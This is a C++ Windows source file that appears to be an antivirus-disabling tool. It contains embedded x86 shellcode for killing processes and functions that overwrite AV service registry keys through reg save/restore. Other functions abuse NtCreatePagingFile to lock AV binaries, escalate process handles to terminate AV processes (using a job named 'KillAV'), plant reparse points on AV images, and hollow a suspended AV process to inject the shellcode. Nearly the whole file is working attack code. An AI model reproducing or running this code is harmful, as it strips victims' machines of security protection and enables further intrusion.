#include "MainHeader.h"
//UCHAR inject_code[] = "\xeb\xfe";
//x86 injection code(see shellcode.asm),Enumerate processes,open/terminate
UCHAR inject_code[] = "\xeb\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x5d\x81\xed\x6f\x10\x40\x00\xe8\xb3\x02\x00\x00\x53\xb9\x64\x00\x00\x00\x51\x8b\x5c\x24\x04\x8d\xb5\x06\x10\x40\x00\x8d\xbd\x12\x13\x40\x00\x8b\x8d\x02\x10\x40\x00\x51\x57\x56\x53\xe8\x3b\x00\x00\x00\x8b\x5c\x24\x04\x68\xf5\x72\x99\x3d\x53\xe8\xc1\x02\x00\x00\x0b\xc0\x74\x27\x68\xe8\x03\x00\x00\xff\xd0\x59\x49\xe3\x03\x51\xeb\xc0\x8b\x1c\x24\x68\xba\x5e\xba\xee\x53\xe8\xa1\x02\x00\x00\x83\xc4\x04\x0b\xc0\x74\x04\x6a\xfe\xff\xd0\xc3\x55\x8b\xec\x81\xc4\x60\xfd\xff\xff\x68\xd5\xb0\x3e\x72\xff\x75\x08\xe8\x7f\x02\x00\x00\x0b\xc0\x0f\x84\x14\x02\x00\x00\x89\x85\x6c\xfd\xff\xff\x68\x4f\xd1\xc1\x5b\xff\x75\x08\xe8\x64\x02\x00\x00\x0b\xc0\x0f\x84\xf9\x01\x00\x00\x6a\x00\x6a\x02\xff\xd0\x83\xf8\xff\x0f\x84\xea\x01\x00\x00\x89\x45\xa8\x68\x5b\x48\xc6\xfb\xff\x75\x08\xe8\x3d\x02\x00\x00\x0b\xc0\x0f\x84\xc7\x01\x00\x00\xc7\x85\x7c\xfd\xff\xff\x2c\x02\x00\x00\x8d\xb5\x7c\xfd\xff\xff\x56\xff\x75\xa8\xff\xd0\x0b\xc0\x0f\x84\xa9\x01\x00\x00\x8b\x45\x14\x3b\x85\x84\xfd\xff\xff\x74\x2d\xfc\x33\xc0\x8b\xd0\x8b\x7d\x0c\x8b\xf7\xb9\xff\xff\xff\xff\xf2\x66\xaf\xf7\xd1\x8b\xfe\x8d\xb5\xa0\xfd\xff\xff\xf3\x66\xa7\x66\x8b\x46\xfe\x66\x8b\x57\xfe\x2b\xc2\x0b\xc0\x74\x2b\x68\x33\x0f\x75\x98\xff\x75\x08\xe8\xd2\x01\x00\x00\x0b\xc0\x0f\x84\x5c\x01\x00\x00\x8d\xb5\x7c\xfd\xff\xff\x56\xff\x75\xa8\xff\xd0\x85\xc0\x0f\x84\x48\x01\x00\x00\xeb\x9d\x68\x9d\x29\xa4\x99\xff\x75\x08\xe8\xa7\x01\x00\x00\x0b\xc0\x0f\x84\x31\x01\x00\x00\x89\x85\x70\xfd\xff\xff\xff\xb5\x84\xfd\xff\xff\x6a\x00\x6a\x01\xff\xd0\x0b\xc0\x0f\x84\x17\x01\x00\x00\x89\x85\x78\xfd\xff\xff\x68\x42\xa8\x6f\x9e\xff\x75\x08\xe8\x72\x01\x00\x00\x0b\xc0\x0f\x84\xe9\x00\x00\x00\x68\x9a\x02\x00\x00\xff\xb5\x78\xfd\xff\xff\xff\xd0\x0b\xc0\x0f\x85\xd4\x00\x00\x00\x8b\x85\x70\xfd\xff\xff\xff\xb5\x84\xfd\xff\xff\x6a\x00\x68\xff\x0f\x1f\x00\xff\xd0\x0b\xc0\x0f\x84\xb7\x00\x00\x00\x89\x85\x74\xfd\xff\xff\x68\xa6\xb8\xbf\x9a\xff\x75\x08\xe8\x25\x01\x00\x00\x0b\xc0\x0f\x84\x8e\x00\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68\xc8\x00\x00\x00\x6a\x00\xff\xb5\x74\xfd\xff\xff\xff\xd0\x0b\xc0\x74\x74\x89\x85\x68\xfd\xff\xff\x68\x35\xbf\xa0\xbe\xff\x75\x08\xe8\xf0\x00\x00\x00\x0b\xc0\x74\x5d\x8d\xb5\x64\xfd\xff\xff\x56\x68\xc8\x00\x00\x00\x8b\x75\x10\x56\xff\xb5\x68\xfd\xff\xff\xff\xb5\x74\xfd\xff\xff\xff\xd0\x0b\xc0\x74\x3b\x68\xb3\x74\x18\xe6\xff\x75\x08\xe8\xbd\x00\x00\x00\x0b\xc0\x74\x2a\x8d\xb5\x60\xfd\xff\xff\x56\x6a\x00\x6a\x00\xff\xb5\x68\xfd\xff\xff\x6a\x00\x6a\x00\xff\xb5\x74\xfd\xff\xff\xff\xd0\x0b\xc0\x74\x09\x50\x8b\x85\x6c\xfd\xff\xff\xff\xd0\x8b\x85\x6c\xfd\xff\xff\xff\xb5\x74\xfd\xff\xff\xff\xd0\x8b\x85\x6c\xfd\xff\xff\xff\xb5\x78\xfd\xff\xff\xff\xd0\xe9\x8f\xfe\xff\xff\x8b\x85\x6c\xfd\xff\xff\xff\x75\xa8\xff\xd0\xc9\xc2\x10\x00\xe8\x17\x00\x00\x00\x68\x19\x2b\x90\x95\x53\xe8\x4f\x00\x00\x00\x0b\xc0\x74\x07\x68\x9a\x02\x00\x00\xff\xd0\xc3\xfc\x33\xd2\x6a\x40\x83\x2c\x24\x10\x5a\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x14\x68\xca\x55\xda\x46\x6a\x18\x8b\x72\x28\x33\xff\x59\x33\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xc7\x0f\x57\xc1\xcf\x03\x01\x3c\x24\x5f\x33\xf8\xe2\xe8\x58\x3b\xf8\x8b\x5a\x10\x8b\x12\x75\xd1\xc3\x8b\x44\x24\x04\x8b\x4c\x24\x08\x55\x8b\xe9\x8b\x58\x3c\x03\xd8\x8b\x53\x78\x03\xd0\x8b\x4a\x20\x03\xc8\x8b\x7a\x24\x03\xf8\x8b\x52\x1c\x03\xd0\x8b\x31\x03\xf0\x50\x57\x33\xff\x33\xc0\xac\x0a\xc0\x74\x12\x57\xc1\xe7\x07\xc1\x2c\x24\x19\x0b\x3c\x24\x83\xc4\x04\x33\xf8\xeb\xe9\x8b\xc7\x5f\x3b\xc5\x74\x09\x58\x83\xc1\x04\x83\xc7\x02\xeb\xcf\x33\xc0\x66\xff\x37\x66\x58\x8b\xf8\x58\x8b\x14\xba\x03\xd0\x92\x5d\xc2\x08\x00\x00\x00";

bool RegSafe(std::wstring av_reg_path_sp, std::wstring av_reg_path_sp_key)
{
	HKEY hKey;
	std::wstring path = av_reg_path_sp + L"\\" + av_reg_path_sp_key;
	std::wstring path2 = path + L"2";
	std::wstring regSave = L"reg save HKEY_LOCAL_MACHINE\\" + path2 + L" hive.hiv";				//reg save HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\aswSP2  hive.hiv
	std::wstring regRestore = L"reg restore HKEY_LOCAL_MACHINE\\" + path + L" hive.hiv";				//reg restore HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\aswSP  hive.hiv


	
	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, path2.c_str(), 0, NULL, REG_OPTION_VOLATILE,	//создали фейкковую ветку
		KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
	{
		std::wcout << "CreateFakeKey Error - " << GetLastError() << std::endl;
		return 0;
	}
	_wsystem(regSave.c_str());																				//сделали бэкап фейка
	_wsystem(regRestore.c_str());																			//восстановили фейк в ветку реестра АВ
	remove("hive.hiv");
	//делаем определенные действия с разделом
	RegCloseKey(hKey);
	return 1;
}

bool PageLock(std::wstring av_image_path)
{
	bool result_ = false;
	UNICODE_STRING uni1;
	_NtCreatePagingFile NtCreatePagingFile;
	LARGE_INTEGER lrg1_ = { 0 };
	LARGE_INTEGER lrg2_ = { 0 };
	//Init minimal size pgfile
	lrg1_.LowPart = 0x02000000;
	lrg2_.LowPart = 0x05000000;
	NtCreatePagingFile = (_NtCreatePagingFile)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtCreatePagingFile");
	if (NtCreatePagingFile != NULL)
	{
		RtlInitUnicodeString(&uni1, av_image_path.c_str());
		if (NT_SUCCESS(NtCreatePagingFile(&uni1, &lrg1_, &lrg2_, 0x0)))
			result_ = true;
		else
		{
			std::wcout << "NtCreatePagingFile error code - " << GetLastError() << std::endl;
		}
	}
	else
	{
		std::wcout << "GetLibraryProcAddress error code - " << GetLastError() << std::endl;
	}
	return result_;
}

BOOL DupHandleAttack(unsigned int pid_)
{
	HANDLE handle1;
	HANDLE full_acc_handle;
	BOOL return_val = false;

	handle1 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid_);	
	if (handle1 != NULL)
	{
		if (NT_SUCCESS(NtDuplicateObject((HANDLE)-1, handle1, (HANDLE)-1, &full_acc_handle,
			PROCESS_ALL_ACCESS, NULL, DUPLICATE_SAME_ATTRIBUTES)))
		{
			return_val = TerminateProcess(full_acc_handle, 0x29a);
			if (!return_val)
			{
				return_val = JobTerm(full_acc_handle);
				if (!return_val)
				{
					for (int i = 0; i <= 4096; i++)
					{
						HANDLE copy_handle;
						if (DuplicateHandle(full_acc_handle, (HANDLE)i, (HANDLE)-1,
							&copy_handle, NULL, false, DUPLICATE_CLOSE_SOURCE) != false)
						{
							CloseHandle(copy_handle);
							return_val = true;
						}
					}
					if (return_val == false)
					{
						std::wcout << "DuplicateHandle error code - " << GetLastError << std::endl;
					}
				}
			}
			CloseHandle(full_acc_handle);
		}
		else
		{
			std::wcout << "NtDuplicateObject error code - " << (int)GetLastError << std::endl;
		}
		CloseHandle(handle1);
	}
	else
	{
		std::wcout << "OpenProcess error code - " << GetLastError << " Handle val - " << handle1 << std::endl;
	}
	return return_val;
}


bool JobTerm(HANDLE full_acc_handle)
{
	bool result_ = false;
	HANDLE job_handle = CreateJobObject(NULL, L"KillAV");
	if (job_handle != NULL)
	{
		if (AssignProcessToJobObject(job_handle, full_acc_handle))
		{
			if (TerminateJobObject(job_handle, 0x29a))
				result_ = true;
		}
	}
	return result_;
}

void GetPrivilege(LPCWSTR priv)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES, &hToken);
	LookupPrivilegeValue(NULL, priv, &tp.Privileges[0].Luid);
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp,
		sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	CloseHandle(hToken);
}

HANDLE OpenLinkHandle(LPCTSTR pszPath) {
	return CreateFile(pszPath, GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING,
		FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);
}

bool ReparsePointAttack(std::wstring av_image_path)
{
	//Get priveleges SE_BACKUP_NAME, SE_RESTORE_NAME, SE_CREATE_SYMBOLIC_LINK_NAME
	GetPrivilege(SE_BACKUP_NAME);
	GetPrivilege(SE_RESTORE_NAME);
	GetPrivilege(SE_CREATE_SYMBOLIC_LINK_NAME);

	char reparse_buf[MAX_PATH * 3];
	PREPARSE_GUID_DATA_BUFFER rd = (PREPARSE_GUID_DATA_BUFFER)reparse_buf;
	ZeroMemory(reparse_buf, MAX_PATH * 3);

	DWORD dwLen = 0;
	LPCWSTR link_name_full = (LPCWSTR)av_image_path.c_str();

	// {07A869CB-F647-451F-840D-964A3AF8C0B6}
	static const GUID my_guid =
	{
		0x7a869cb, 0xf647, 0x451f,
	{ 0x84, 0xd, 0x96, 0x4a, 0x3a, 0xf8, 0xc0, 0xb6 }
	};

	//UINT num = 0xABCD;
	char eicar[] = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
		"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

	rd->ReparseTag = 0xFF00; // Собственный тег
	rd->ReparseDataLength = strlen(eicar);
	rd->Reserved = 0;
	rd->ReparseGuid = my_guid;
	memcpy(rd->GenericReparseBuffer.DataBuffer, &eicar, strlen(eicar));

	//open file with  FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS flags 
	HANDLE hHandle = OpenLinkHandle(link_name_full);

	

	if (INVALID_HANDLE_VALUE == hHandle)
	{
		std::wcout << "handle " <<  GetLastError() << std::endl;
		return FALSE;
	}

	// Установить reparse данные открытой папке
	//wprintf(L"Create link:\n");
	if (!DeviceIoControl(hHandle, FSCTL_SET_REPARSE_POINT,
		rd, rd->ReparseDataLength
		+ REPARSE_GUID_DATA_BUFFER_HEADER_SIZE,
		NULL, 0, &dwLen, NULL))
	{

		// Если добавить reparse данные
		// не удалось, папку следует удалить
		//wprintf(L"Cant create reparse point\n");
		std::wcout << GetLastError() << std::endl;
		CloseHandle(hHandle);
		return FALSE;
	}

	CloseHandle(hHandle);
	return TRUE;
}

//That attack create original fake AV_image process,inject to him shellcode
//terminated other AV processes,and suspend at the end.
bool ProxyInjectAttack(std::wstring av_image_path, std::wstring proc_name)
{
	bool status_ = false;
	PROCESS_BASIC_INFORMATION pbi;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD ImageBase;
	DWORD nb_read;
	DWORD EP_;
	LPVOID heap_addr;
	HANDLE heap_1;
	HANDLE hsect;

	heap_1 = Heap_init();
	if (heap_1 == NULL)
		return status_;
	heap_addr = HeapAlloc(heap_1, HEAP_ZERO_MEMORY, 0x500);
	if (heap_addr == NULL)
		return status_;
	memset(&si, 0, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
	//Create Suspend AVimage process
	//
	if (CreateProcess((LPCWSTR)av_image_path.c_str(), NULL, NULL, NULL, NULL,
		CREATE_SUSPENDED,
		NULL, NULL, &si, &pi))
	{
		//Query Information(PEB)from AVimage process
		if (NT_SUCCESS(NtQueryInformationProcess(pi.hProcess, (PROCESSINFOCLASS)0, &pbi,
			sizeof(PROCESS_BASIC_INFORMATION), NULL)))
		{
			//Read ImageBase
			if (ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, 4, &nb_read)
				&& nb_read == 4)
			{
				//Read MZ-PE header
				if (ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase, heap_addr, 0x500, &nb_read)
					&& nb_read == 0x500)
				{
					EP_ = get_entrypoint((char *)heap_addr);
					LPVOID lpMem;
					SIZE_T size, size2;
					size = get_size_of_image((char *)heap_addr);
					lpMem = VirtualAllocEx((HANDLE)-1, NULL, size, MEM_COMMIT, PAGE_READWRITE);
					if (lpMem != NULL)
					{
						//Read image
						if (ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase, lpMem, size, &nb_read)
							&& nb_read == size)
						{
							LARGE_INTEGER a;
							a.HighPart = 0;
							a.LowPart = size;
							//Create-Map to current process,image-section of the AV process
							if (NT_SUCCESS(NtCreateSection(&hsect, SECTION_ALL_ACCESS, NULL, &a,
								PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
							{
								PVOID BaseAddress;

								size2 = size;
								BaseAddress = (PVOID)0;
								if (NT_SUCCESS(NtMapViewOfSection(hsect, GetCurrentProcess(), &BaseAddress, NULL,
									NULL, NULL, &size2, (SECTION_INHERIT)1,
									NULL, PAGE_EXECUTE_READWRITE)))
								{
									//Unmap section AV-image

									if (NT_SUCCESS(NtUnmapViewOfSection(pi.hProcess, (PVOID)ImageBase)))
									{
										//Patch oep to shellcode here
										memcpy((char*)((DWORD)lpMem + EP_), inject_code, sizeof(inject_code));
										memcpy((char*)((DWORD)lpMem + EP_ + 2), &pi.dwProcessId, 4);
										memcpy((char*)((DWORD)lpMem + EP_ + 6), proc_name.c_str(), (proc_name.size()) * 2);
										//Copy patched entry point code to mapped section
										memcpy(BaseAddress, lpMem, size);
										BaseAddress = (PVOID)ImageBase;
										//Map patched entry to av-process
										if (NT_SUCCESS(NtMapViewOfSection(hsect, pi.hProcess, &BaseAddress,
											NULL, NULL, NULL, &size,
											(SECTION_INHERIT)1,
											NULL, PAGE_EXECUTE_READWRITE)))
										{
											//In theory shellcode injected
											//Launch them >>>>
											ResumeThread(pi.hThread);
											status_ = true;
										}
										else
										{
											std::wcout << "Map patched entry to av-process error code - " << GetLastError << std::endl;
										}
									}
									else
									{
										std::wcout << "Unmap section AV-image error code - " << GetLastError << std::endl;
									}
								}
								else
								{
									std::wcout << "NtMapViewOfSection error code - " << GetLastError << std::endl;
								}
								NtClose(hsect);
							}
							else
							{
								std::wcout << "Create-Map to current process,image-section of the AV process error code - " << GetLastError << std::endl;
							}
						}
						else
						{
							std::wcout << "Read Image error code - " << GetLastError << std::endl;
						}
						VirtualFree(lpMem, NULL, MEM_RELEASE);
					}
				}
				else
				{
					std::wcout << "Read MZ - PE header error code - " << GetLastError << std::endl;
				}
			}
			else
			{
				std::wcout << "Read ImageBase error code - " << GetLastError << std::endl;
			}
		}
		else
		{
			std::wcout << "Query Information(PEB)from AVimage process error code - " << GetLastError << std::endl;
		}
		CloseHandle(pi.hProcess);
	}
	else
	{
		std::wcout << "Create Suspend AVimage process error code - " << GetLastError << std::endl;
	}
	return status_;
}
int get_entrypoint(char *read_proc)
{
	IMAGE_DOS_HEADER *idh = NULL;
	IMAGE_NT_HEADERS *inh = NULL;

	idh = (IMAGE_DOS_HEADER*)read_proc;
	inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);

	return (inh->OptionalHeader.AddressOfEntryPoint);
}
int get_size_of_image(char *read_proc)
{
	IMAGE_DOS_HEADER *idh = NULL;
	IMAGE_NT_HEADERS *inh = NULL;

	idh = (IMAGE_DOS_HEADER*)read_proc;
	inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);

	return (inh->OptionalHeader.SizeOfImage);
}